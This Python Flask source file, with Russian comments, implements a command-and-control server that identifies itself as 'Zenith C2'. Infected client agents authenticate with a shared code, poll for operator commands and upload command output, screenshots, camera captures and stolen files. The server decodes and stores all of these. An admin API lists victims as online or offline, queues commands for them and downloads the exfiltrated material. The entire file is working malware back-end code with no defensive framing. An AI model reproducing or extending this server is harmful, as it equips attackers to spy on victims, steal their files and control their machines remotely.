import os
import json
import time
import base64
from flask import Flask, request, jsonify, send_from_directory

app = Flask(__name__)

# --- Конфигурация ---
ADMIN_PASS = "MY_ADMIN_PASSWORD"
AGENT_CODE = "COSMOS0611"
DB_FILE = "clients.json"
SCREENS_DIR = "screens"
DOWNLOADS_DIR = "downloads"

# Создание необходимых директорий
for d in [SCREENS_DIR, DOWNLOADS_DIR]:
    if not os.path.exists(d):
        os.makedirs(d)

clients = {}

def load_db():
    global clients
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, "r", encoding="utf-8") as f:
                clients = json.load(f)
        except:
            clients = {}

def save_db():
    with open(DB_FILE, "w", encoding="utf-8") as f:
        json.dump(clients, f, ensure_ascii=False, indent=4)

@app.route('/get_task', methods=['GET'])
def agent_get():
    auth = request.headers.get('X-Secret-Auth')
    cid = request.headers.get('Client-ID')
    info = request.headers.get('Client-Info')
    
    if auth != AGENT_CODE or not cid:
        return "Auth Fail", 403

    if cid not in clients:
        clients[cid] = {
            "name": info,
            "task": "none",
            "result": "Ожидание...",
            "last_seen": 0,
            "status": "offline"
        }
    
    clients[cid]["last_seen"] = time.time()
    save_db()
    
    task = clients[cid]["task"]
    clients[cid]["task"] = "none"
    return task

@app.route('/send_result', methods=['POST'])
def agent_post():
    cid = request.headers.get('Client-ID')
    if cid not in clients:
        return "Not Found", 404
        
    try:
        data = request.data.decode('utf-8', errors='ignore')
        
        # Обработка изображений (Скриншот/Камера)
        if data.startswith("IMAGE:"):
            _, type_img, b64_data = data.split(":", 2)
            timestamp = int(time.time())
            filename = f"{type_img}_{cid}_{timestamp}.png"
            filepath = os.path.join(SCREENS_DIR, filename)
            
            with open(filepath, "wb") as f:
                f.write(base64.b64decode(b64_data))
            
            clients[cid]["result"] = f"IMAGE_PATH:{filepath}"
            
        # Обработка файлов
        elif data.startswith("FILE_DATA:"):
            _, filename, b64_data = data.split(":", 2)
            filepath = os.path.join(DOWNLOADS_DIR, f"{cid}_{filename}")
            
            with open(filepath, "wb") as f:
                f.write(base64.b64decode(b64_data))
            
            clients[cid]["result"] = f"DOWNLOADED_PATH:{filepath}"
        
        else:
            clients[cid]["result"] = data
            
        save_db()
        return "OK"
    except Exception as e:
        return str(e), 500

# --- Админ-панель API ---

@app.route('/admin/list', methods=['GET'])
def admin_list():
    if request.headers.get('Admin-Auth') != ADMIN_PASS:
        return "Forbidden", 403
    
    now = time.time()
    for cid in clients:
        clients[cid]["status"] = "online" if now - clients[cid]["last_seen"] < 25 else "offline"
    return jsonify(clients)

@app.route('/admin/push', methods=['POST'])
def admin_push():
    if request.headers.get('Admin-Auth') != ADMIN_PASS:
        return "Forbidden", 403
        
    req_data = request.json
    cid = req_data.get("cid")
    cmd = req_data.get("cmd")
    
    if cid in clients:
        clients[cid]["task"] = cmd
        return "OK"
    return "Not Found", 404

@app.route('/admin/get_file/<path:filename>')
def admin_get_file(filename):
    if request.headers.get('Admin-Auth') != ADMIN_PASS:
        return "Forbidden", 403
    return send_from_directory('.', filename)

if __name__ == '__main__':
    load_db()
    print("[*] Server Zenith C2 Started on port 43445")
    app.run(host='0.0.0.0', port=43445)